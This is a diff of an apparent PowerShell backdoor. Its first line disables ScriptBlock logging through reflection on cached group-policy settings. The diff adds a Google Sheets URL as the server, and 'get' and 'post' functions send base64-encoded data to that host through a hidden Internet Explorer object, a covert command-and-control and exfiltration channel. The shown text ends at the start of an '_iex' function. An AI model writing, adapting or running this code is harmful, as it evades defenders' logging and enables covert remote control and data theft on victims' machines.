@@ -1,12 +1,14 @@
 iex('$gp=[ref].Assembly.GetType("System.Management.Automation.Utils").GetField("cachedGroupPolicySettings","NonPublic,Static");if($gp){$gpc=$gp.GetValue($null);if($gpc["ScriptBlockLogging"]){$gpc["ScriptBlockLogging"]["EnableScriptBlockLogging"]=0;$gpc["ScriptBlockLogging"]["EnableScriptBlockInvocationLogging"]=0;}$val=[System.Collections.Generic.Dictionary[string,System.Object]]::new();$val.Add("EnableScriptBlockLogging",0);$val.Add("EnableScriptBlockInvocationLogging",0);$gpc["HKEY_LOCAL_MACHINE\Software\Policies\Microsoft\Windows\PowerShell\ScriptBlockLogging"]=$val;}');
 $CHUNK = 50000;
-$SRV = "";
+$SRV = "https://docs.google.com/spreadsheets/d/1OoUNxbLtZ2sklvwN2qgM3pdh6Rk6708f9ruHzi8QpQ0/edit";
 
 function get {
   param($ie, $k, $d);
   $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
   $ie.navigate2($SRV + "?$k=" + $x, 14, 0, $null, $null);
-  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
+  while ($ie.busy -or ($ie.readystate -ne 4)) {
+    sleep -seconds 1;
+  };
   return $ie.document.lastchild.innertext;
 }
 
@@ -14,7 +16,9 @@ function post {
   param($ie, $k, $d, $p);
   $x = [Convert]::ToBase64String([Text.Encoding]::UTF8.GetBytes($d));
   $ie.navigate2($SRV + "?$k=" + $x, 14, 0, [Text.Encoding]::UTF8.GetBytes("d=$p"), $null);
-  while ($ie.busy -or ($ie.readystate -ne 4)) {sleep -seconds 1};
+  while ($ie.busy -or ($ie.readystate -ne 4)) {
+    sleep -seconds 1;
+  };
 }
 
 function _iex {
